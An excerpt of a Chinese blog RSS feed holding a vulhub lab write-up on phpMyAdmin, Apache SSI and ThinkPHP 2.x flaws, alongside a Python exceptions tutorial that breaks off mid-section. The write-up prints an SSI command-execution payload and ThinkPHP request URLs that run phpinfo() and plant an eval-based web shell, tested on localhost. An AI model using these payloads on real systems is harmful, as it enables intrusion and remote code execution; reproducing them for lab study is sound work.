<og:description>在上篇blog写完的几天后，有读者反映写的过于复杂，导致无法有效的进行实践；博主在考虑到园子里程序员水平高低不一致的情况，所以打算放慢脚步，对类的一些内容进行详细的讲解，顺带的会写一些笔者所遇到过的E</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/billming/p/emit-study-field.html</dc:identifier>
</item>
<item>
<title>每天复现一个漏洞--vulhub - 天下大木头</title>
<link>http://www.cnblogs.com/Wh7Ro/p/11960520.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Wh7Ro/p/11960520.html</guid>
<description>&lt;h2&gt;&lt;strong&gt;phpmyadmin scripts/setup.php 反序列化漏洞（WooYun-2016-199433）&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;漏洞原理:&lt;/strong&gt;&lt;a href=&quot;http://www.polaris-lab.com/index.php/archives/66/&quot;&gt;&lt;strong&gt;http://www.polaris-lab.com/index.php/archives/66/&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;根据提示我们先进入到 /scripts/setup.php 的目录下&lt;/p&gt;
&lt;p&gt;由于 configuration 参数是可控的 所以我们可以根据 poc 或自行构造&lt;/p&gt;
&lt;img src=&quot;https://www.wjlshare.tk/wp-content/uploads/2019/09/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2019-09-16-%E4%B8%8B%E5%8D%888.43.06-1024x783.png&quot; alt=&quot;&quot; class=&quot;wp-image-602&quot;/&gt;&lt;p&gt;然后这是我们序列化后的结果&lt;/p&gt;
&lt;img src=&quot;https://www.wjlshare.tk/wp-content/uploads/2019/09/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7-2019-09-16-%E4%B8%8B%E5%8D%888.42.50-1024x547.png&quot; alt=&quot;&quot; class=&quot;wp-image-603&quot;/&gt;&lt;p&gt;然后就复现成功了&lt;/p&gt;
&lt;h2&gt;Apache SSI 远程命令执行漏洞（2019.11.27）&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;当目标服务器开启了SSI与CGI支持，我们就可以上传shtml文件，利用&amp;lt;!--#exec cmd=&quot;id&quot; --&amp;gt;语法执行命令。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;什么是ssi&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;简单的来说ssi可以对静态的html网页进行动态的改动，我们通过在静态的html页面中插入不同的内容，如果不利用ssi的话我们需要对页面改变就需要重新生成所有的静态的html，但是如果有了ssi 的话服务器会根据嵌入文件自动生成网页，输出到浏览器，如要修改则只需要修改嵌入的文件&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它们允许将动态生成的内容添加到现有HTML页面，而无需通过CGI程序或其他动态技术提供整个页面。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;文章链接：&lt;a href=&quot;https://blog.csdn.net/fdipzone/article/details/10820127&quot;&gt;https://blog.csdn.net/fdipzone/article/details/10820127&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SHTML文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;.shtml 文件就是 html 文件加个 ssi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CGI支持&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;CGI是一个通用网关接口（CGI本身是一套协议和规范）&lt;/p&gt;
&lt;p&gt;首先简单的说一下web server 和 web应用程序之间的关系，这两者的关系就像手机和手机应用程序一样。因为web server所处理的内容全部都是静态的，所以如果想要处理动态的内容需要CGI的支持（需要依赖web应用程序）web server 依赖CGI协议将动态的请求传给web应用程序进行处理，然后web应用程序处理完毕之后再通过cgi协议返回给web server（html静态页面）&lt;/p&gt;
&lt;p&gt;这里由于我们是要访问上传的那个文件的，所以坑定是动态的请求，这一过程是需要交给web应用程序去处理的，然后web应用程序将处理后的结果返回给web server&lt;/p&gt;
&lt;img src=&quot;https://www.wjlshare.tk/wp-content/uploads/2019/11/20170309183226078.png&quot; alt=&quot;&quot; class=&quot;wp-image-825&quot;/&gt;&lt;p&gt;这里我个人觉得我说的不够清楚我后面会继续进行修改&lt;/p&gt;
&lt;p&gt;文章链接：&lt;a href=&quot;https://www.jianshu.com/p/e5e471f368aa&quot;&gt;https://www.jianshu.com/p/e5e471f368aa&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/LiuNian_SiYu/article/details/60964966&quot;&gt;https://blog.csdn.net/LiuNian_SiYu/article/details/60964966&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最终结果如下图&lt;/p&gt;
&lt;img src=&quot;https://www.wjlshare.tk/wp-content/uploads/2019/11/%E6%88%AA%E5%B1%8F2019-11-27%E4%B8%8B%E5%8D%8811.35.09-1024x640.png&quot; alt=&quot;&quot; class=&quot;wp-image-820&quot;/&gt;&lt;p&gt;我们通过上传 内容为&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;&amp;lt;!--#exec cmd=&quot;id&quot; --&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;的shell.shtml，然后访问文件地址可以发现成功&lt;/p&gt;
&lt;h2&gt;ThinkPHP 2.x 任意代码执行漏洞 (2019.11.28)&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;`preg_replace`的`/e`模式匹配路由导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit ] )&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）&lt;/p&gt;
&lt;p&gt;有漏洞的是这个文件/trunk/ThinkPHP/Lib/Core/Dispatcher.class.php&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;125 – $res = preg_replace(‘@(w+)’.$depr.’([^'.$depr.'\/]+)@e’, ‘$var[\'\\1\']=”\\2″;’, implode($depr,$paths));

125 + $res = preg_replace(‘@(w+)’.$depr.’([^'.$depr.'\/]+)@e’, ‘$var[\'\\1\']=\’\\2\’;', implode($depr,$paths));&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这是官方前后发布的补丁，我们可以看到官方把 \\2\两边的双引号变成了单引号&lt;/p&gt;
&lt;p&gt;（这里我搜了好多有关于thinkphp 2.x rce但文章但是发现好像都很难找到了，所以这里有个疑问存留&lt;/p&gt;
&lt;p&gt;如何知道是这个路径下的问题 是通过代码审计的嘛？&lt;/p&gt;
&lt;p&gt;复现过程：&lt;/p&gt;
&lt;img src=&quot;https://www.wjlshare.tk/wp-content/uploads/2019/11/%E6%88%AA%E5%B1%8F2019-11-28%E4%B8%8B%E5%8D%8810.59.52-1024x640.png&quot; alt=&quot;&quot; class=&quot;wp-image-827&quot;/&gt;&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;http://127.0.0.1:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D`&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;既然我们都可以执行任意命令了何不来个shell呢？（奸笑&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;http://127.0.0.1:8080/index.php/index.php?s=/index/index/name/${${@eval($_POST[1])}}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;别的不多说了俺们直接蚁剑安排上！！&lt;/p&gt;
&lt;img src=&quot;https://www.wjlshare.tk/wp-content/uploads/2019/11/%E6%88%AA%E5%B1%8F2019-11-28%E4%B8%8B%E5%8D%8811.09.22-1024x721.png&quot; alt=&quot;&quot; class=&quot;wp-image-829&quot;/&gt;</description>
<pubDate>Fri, 29 Nov 2019 13:46:00 +0000</pubDate>
<dc:creator>天下大木头</dc:creator>
<og:description>phpmyadmin scripts/setup.php 反序列化漏洞（WooYun 2016 199433） 漏洞原理:http://www.polaris lab.com/index.php/ar</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Wh7Ro/p/11960520.html</dc:identifier>
</item>
<item>
<title>python3快速入门教程错误和异常 - pypypypy</title>
<link>http://www.cnblogs.com/pypypy/p/11960471.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/pypypy/p/11960471.html</guid>
<description>&lt;p&gt;Python 中(至少)有两种错误：语法错误(syntax errors)和异常(exceptions)。&lt;/p&gt;
&lt;h2 id=&quot;_1&quot;&gt;语法错误&lt;/h2&gt;
&lt;p&gt;语法错误又称作解析错误:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;while&lt;/span&gt; True &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Hello world&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
  File &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;stdin&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, line 1
    &lt;span&gt;while&lt;/span&gt; True &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Hello world&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
                           &lt;/span&gt;^&lt;span&gt;
SyntaxError: invalid syntax&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;语法分析器指出错误行，并且在检测到错误的位置前面显示^。&lt;/p&gt;
&lt;h2 id=&quot;_2&quot;&gt;异常&lt;/h2&gt;
&lt;p&gt;即使语句或表达式在语法上是正确的，执行时也可能会引发错误。运行期检测到的错误称为异常&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; 10 * (1/&lt;span&gt;0)
Traceback (most recent call last):
  File &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;stdin&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, line 1, &lt;span&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;span&gt;
ZeroDivisionError: division by zero
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; 4 + spam*3&lt;span&gt;
Traceback (most recent call last):
  File &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;stdin&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, line 1, &lt;span&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;span&gt;
NameError: name &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;spam&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;is&lt;/span&gt; &lt;span&gt;not&lt;/span&gt;&lt;span&gt; defined
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; + 2&lt;span&gt;
Traceback (most recent call last):
  File &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;stdin&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, line 1, &lt;span&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;span&gt;
TypeError: Can&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;t convert &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;int&lt;span&gt;'&lt;/span&gt;&lt;span&gt; object to str implicitly&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;错误信息的最后一行指出发生了什么错误。异常也有不同的类型，异常类型做为错误信息的一部分显示出来：示例中的异常分别为 &lt;code&gt;ZeroDivisionError&lt;/code&gt;, &lt;code&gt;NameError&lt;/code&gt; 和 &lt;code&gt;TypeError&lt;/code&gt;。打印错误信息时，异常的类型作为异常的内置名显示。对于所有的内置异常都是如此，不过用户自定义异常就不一定了（尽管这是很有用的约定）。标准异常名是内置的标识符(非保留关键字)。&lt;/p&gt;
&lt;p&gt;这行后一部分是关于该异常类型的详细说明，这意味着它的内容依赖于异常类型。&lt;/p&gt;
&lt;p&gt;错误信息的前半部分以堆栈的形式列出异常发生的位置。通常在堆栈中列出了源代码行，然而，来自标准输入的源码不会显示出来。&lt;/p&gt;
&lt;p&gt;内置的异常 列出了内置异常和它们的含义。&lt;/p&gt;
&lt;h2 id=&quot;_3&quot;&gt;异常处理&lt;/h2&gt;
&lt;p&gt;例子：要求用户输入直到输入合法的整数为止，但允许用户中断这个程序（使用Control-C或系统支持的任何方法）。注意：用户产生的中断会引发 KeyboardInterrupt 异常。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
...     &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
...         x &lt;/span&gt;= int(input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Please enter a number: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
...         &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;
...     &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; ValueError:
...         &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Oops!  That was no valid number.  Try again...&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;try 语句按如下方式工作。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;首先，执行try和except 之间的内容&lt;/li&gt;
&lt;li&gt;如果没有异常发生，忽略except语句。&lt;/li&gt;
&lt;li&gt;如果在 try 子句执行过程中发生了异常，那么该子句其余的部分就会忽略。如果异常匹配于 * 后面指定的异常类型，就执行对应的except子句。然后继续执行try语句之后的代码。&lt;/li&gt;
&lt;li&gt;如果发生了一个异常，在except 子句中没有与之匹配的分支，它就会传递到上一级try 语句中。如果最终仍找不到对应的处理语句，它就成为未处理异常，终止程序运行，显示提示信息。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;try语句可能包含多个 except 子句，分别指定处理不同的异常。至多执行一个分支。异常处理程序只会处理对应的 try 子句中发生的异常，在同一try语句中，其他子句中发生的异常则不作处理。except 子句可以在元组中列出多个异常的名字，例如:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
... &lt;span&gt;except&lt;/span&gt;&lt;span&gt; (RuntimeError, TypeError, NameError):
...     &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;异常匹配如果except子句中的类相同的类或其基类(反之如果是其子类则不行）。 例如，以下代码将按此顺序打印B，C，D：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt;&lt;span&gt; B(Exception):
    &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;

&lt;span&gt;class&lt;/span&gt;&lt;span&gt; C(B):
    &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;

&lt;span&gt;class&lt;/span&gt;&lt;span&gt; D(C):
    &lt;/span&gt;&lt;span&gt;pass&lt;/span&gt;

&lt;span&gt;for&lt;/span&gt; cls &lt;span&gt;in&lt;/span&gt;&lt;span&gt; [B, C, D]:
    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;raise&lt;/span&gt;&lt;span&gt; cls()
    &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; D:
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;D&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; C:
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;C&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; B:
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;B&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果except B在先，将打印B，B，B。&lt;/p&gt;
&lt;p&gt;最后except子句可以省略例外名称，作为通配符。 请谨慎使用此功能，因为这种方式很容易掩盖真正的编程错误！ 它也可以用来打印错误消息，然后重新引发异常(也允许调用者处理异常）：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; sys

&lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
    f &lt;/span&gt;= open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;myfile.txt&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    s &lt;/span&gt;=&lt;span&gt; f.readline()
    i &lt;/span&gt;=&lt;span&gt; int(s.strip())
&lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; OSError as err:
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;OS error: {0}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.format(err))
&lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; ValueError:
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Could not convert data to an integer.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt;:
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Unexpected error:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, sys.exc_info()[0])
    &lt;/span&gt;&lt;span&gt;raise&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;try … except语句可以带有else子句，该子句只能出现在所有 except 子句之后。当 try 语句没有抛出异常时，需要执行一些代码，可以使用这个子句。例如:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;for&lt;/span&gt; arg &lt;span&gt;in&lt;/span&gt; sys.argv[1&lt;span&gt;:]:
    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
        f &lt;/span&gt;= open(arg, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; OSError:
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;cannot open&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, arg)
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(arg, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;has&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, len(f.readlines()), &lt;span&gt;'&lt;/span&gt;&lt;span&gt;lines&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
        f.close()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;使用else子句比在try子句中附加代码要好，因为这样可以避免 try … except 意外的截获本来不属于它们的那些代码抛出的异常。&lt;/p&gt;
&lt;p&gt;发生异常时，可能会有相关值，作为异常的参数存在。这个参数是否存在、是什么类型，依赖于异常的类型。&lt;/p&gt;
&lt;p&gt;在异常名(元组)之后，也可以为 except 子句指定一个变量。这个变量绑定于异常实例，它存储在instance.args参数中。为了方便起见，异常实例定义了 &lt;strong&gt;str&lt;/strong&gt;() ，这样就可以直接访问过打印参数而不必引用.args。也可以在引发异常之前初始化异常，并根据需要向其添加属性。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
...     &lt;/span&gt;&lt;span&gt;raise&lt;/span&gt; Exception(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;spam&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;eggs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
... &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception as inst:
...     &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(type(inst))    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; the exception instance&lt;/span&gt;
...     &lt;span&gt;print&lt;/span&gt;(inst.args)     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; arguments stored in .args&lt;/span&gt;
...     &lt;span&gt;print&lt;/span&gt;(inst)          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; __str__ allows args to be printed directly,&lt;/span&gt;
...                          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; but may be overridden in exception subclasses&lt;/span&gt;
...     x, y = inst.args     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; unpack args&lt;/span&gt;
...     &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;x =&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, x)
...     &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;y =&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, y)
...
&lt;/span&gt;&amp;lt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Exception&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&amp;gt;&lt;span&gt;
(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;spam&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;eggs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;spam&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;eggs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
x &lt;/span&gt;=&lt;span&gt; spam
y &lt;/span&gt;= eggs
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;对于那些未处理的异常，如果它们带有参数，那么就会被作为异常信息的最后部分(“详情”)打印出来。&lt;/p&gt;
&lt;p&gt;异常处理器不仅仅处理那些在 try 子句中立刻发生的异常，也会处理那些 try 子句中调用的函数内部发生的异常。例如:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
...     &lt;/span&gt;&lt;span&gt;raise&lt;/span&gt; Exception(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;spam&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;eggs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
... &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; Exception as inst:
...     &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(type(inst))    &lt;span&gt;#&lt;/span&gt;&lt;span&gt; the exception instance&lt;/span&gt;
...     &lt;span&gt;print&lt;/span&gt;(inst.args)     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; arguments stored in .args&lt;/span&gt;
...     &lt;span&gt;print&lt;/span&gt;(inst)          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; __str__ allows args to be printed directly,&lt;/span&gt;
...                          &lt;span&gt;#&lt;/span&gt;&lt;span&gt; but may be overridden in exception subclasses&lt;/span&gt;
...     x, y = inst.args     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; unpack args&lt;/span&gt;
...     &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;x =&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, x)
...     &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;y =&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, y)
...
&lt;/span&gt;&amp;lt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Exception&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&amp;gt;&lt;span&gt;
(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;spam&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;eggs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;spam&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;eggs&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
x &lt;/span&gt;=&lt;span&gt; spam
y &lt;/span&gt;= eggs
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;_4&quot;&gt;抛出异常&lt;/h2&gt;
&lt;p&gt;raise 语句可强行抛出指定的异常。例如:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;raise&lt;/span&gt; NameError(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;HiThere&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
Traceback (most recent call last):
  File &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;stdin&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, line 1, &lt;span&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;span&gt;
NameError: HiThere&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;要抛出的异常由raise的唯一参数标识。它必需是异常实例或异常类(继承自 Exception 的类）。如果传递异常类，它将通过调用它的没有参数的构造函数而隐式实例化：&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;22.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;raise&lt;/span&gt; ValueError  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; shorthand for 'raise ValueError()'&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果你想知道异常是否抛出，但不想处理它，raise语句可简单的重新抛出该异常:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
...     &lt;/span&gt;&lt;span&gt;raise&lt;/span&gt; NameError(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;HiThere&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
... &lt;/span&gt;&lt;span&gt;except&lt;/span&gt;&lt;span&gt; NameError:
...     &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;An exception flew by!&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
...     &lt;/span&gt;&lt;span&gt;raise&lt;/span&gt;&lt;span&gt;
...
An exception flew by!
Traceback (most recent call last):
  File &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;stdin&amp;gt;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, line 2, &lt;span&gt;in&lt;/span&gt; &amp;lt;module&amp;gt;&lt;span&gt;
NameError: HiThere&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;_5&quot;&gt;用户自定义异常&lt;/h2&gt;
